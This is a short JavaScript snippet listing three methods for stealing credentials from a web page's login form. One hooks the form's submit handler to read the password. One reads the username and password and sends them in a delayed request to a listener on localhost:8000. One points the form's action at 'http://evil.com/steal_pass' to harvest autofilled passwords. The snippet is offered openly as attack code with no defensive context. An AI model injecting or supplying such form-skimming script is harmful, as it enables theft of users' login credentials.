/*** Method 1 ***/
function intercept () {
    var password = document.forms[0].elements[1].value;
    /* do whatever you want with "password" */
}
document.forms[0].onsubmit = intercept;


/*** Method 2 ***/
var user = document.forms[0].elements[0].value;
var pass = document.forms[0].elements[1].value;
 
window.setTimeout( function () {
    var request = new XMLHttpRequest();
    request.open("GET", "http://localhost:8000/?user="+user+"&pass="+pass, true);
    request.send()
}, 5000);



/*** Method 3 ***/
/* stealing from auto-complete */
window.setTimeout(function () {
document.forms[0].action = "http://evil.com/steal_pass";
document.forms[0].submit();
}, 10000);
